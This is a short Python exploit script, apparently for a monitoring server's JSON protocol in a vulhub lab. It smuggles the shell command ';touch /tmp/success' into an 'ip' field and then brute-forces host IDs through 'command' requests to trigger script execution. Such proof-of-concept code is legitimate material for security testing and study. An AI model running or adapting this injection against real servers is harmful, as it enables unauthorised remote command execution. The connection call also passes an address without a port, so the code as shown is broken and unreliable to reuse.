import socket
import json
import sys
import argparse

'''
官方poc，仅积累
'''
def send(ip, data):
    #创建socket连接
    conn = socket.create_connection(address=ip,timeout=1)
    #编码发送消息
    conn.send(json.dumps(data).encode())
    #消息接受
    data = conn.recv(2048)
    conn.close()
    return data


if __name__ == '__main__':
    args_pararmeter = argparse.ArgumentParser()
    args_pararmeter.add_argument('-i', '--ip', required=False, default="127.0.0.1", help='target ip')
    args = args_pararmeter.parse_args()
    print(send(args.ip, {"request": "active checks", "host": "vulhub", "ip": ";touch /tmp/success"}))
    for i in range(10000, 10500):
        data = send(args.ip, {"request": "command", "scriptid": 1, "hostid": str(i)})
        if data and b'failed' not in data:
            print('hostid: %d' % i)
            print(data)
